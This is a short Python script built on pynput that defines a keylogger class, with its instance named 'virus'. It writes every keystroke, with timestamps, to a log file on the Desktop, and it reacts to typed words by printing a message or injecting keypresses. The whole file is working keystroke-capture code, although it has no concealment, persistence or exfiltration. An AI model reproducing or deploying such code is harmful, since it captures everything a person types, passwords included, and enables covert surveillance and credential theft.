from pynput.keyboard import Key, Listener, Controller
import logging, os


class KeyLogger:
    def __init__(self):
        self.log_dir = os.path.expanduser('~/Desktop')

        logging.basicConfig(filename=(self.log_dir + '\Key_log.txt'),
                            level=logging.DEBUG,
                            format='%(asctime)s: %(message)s')

        self.coolList = [0, 0, 0, 0]

    def on_press(self, key):
        logging.info(key)
        self.coolList.pop(0)
        self.coolList.append(str(key))
        self.check()

    def run(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def check(self):
        #print(self.coolList)
        event_cool = ["'c'", "'o'", "'o'", "'l'"]
        if self.coolList == event_cool:
            print('COOL!!!')

        event_what = ["'w'", "'h'", "'a'", "'t'"]
        if self.coolList == event_what:
            keyboard = Controller()
            with keyboard.pressed(Key.shift):
                keyboard.press('/')
            with keyboard.pressed(Key.shift):
                keyboard.press('/')
            with keyboard.pressed(Key.shift):
                keyboard.press('/')

        

def main():
    virus = KeyLogger()
    virus.run()

if __name__ == '__main__':
    main()
